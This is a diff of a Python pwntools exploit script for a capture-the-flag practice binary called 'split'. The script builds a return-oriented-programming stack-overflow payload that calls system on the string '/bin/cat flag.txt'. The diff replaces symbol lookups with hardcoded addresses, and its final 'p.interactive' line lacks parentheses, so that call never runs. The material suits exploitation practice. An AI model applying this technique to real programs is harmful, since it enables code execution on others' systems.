@@ -50,30 +50,22 @@ from pwn import *
 # create a process object and load the executable binary
 p = process('./split')
 
-# create an ELF object to parse the binary and retrieve useful information
-elf = ELF('./split', checksec=False)
+
 
 # determine the offset to the return address on the stack
 offset = 40
 
 # retrieve the addresses of the desired functions/strings using the ELF object
 ret_address = 0x00000000004007c3
-cat_flag_address = elf.search('/bin/cat flag.txt').next()
-system_address = elf.plt.system
 
-# display the retrieved addresses
-info('cat_flag_address : {}'.format(hex(cat_flag_address)))
-info('system_address: {}'.format(hex(system_address)))
 
 # construct the payload by padding the offset with arbitrary characters
 # then appending the address of the return instruction and the address of the system call with the argument of the flag file
-payload = 'A' * offset + p64(ret_address) + p64(cat_flag_address) + p64(system_address)
+payload = 'A' * offset + p64(ret_address) + p64(0x00601060) + p64(0x0040074b)
 
-# send the payload to the process and read the result
+# send the payload to the process and get the result and priviledge
 p.sendline(payload)
-p.recvuntil('Thank you!')
-result = p.recvall().strip('\n')
+p.interactive
 
-# print the result of executing the payload
-success(result)
+
 ~~~
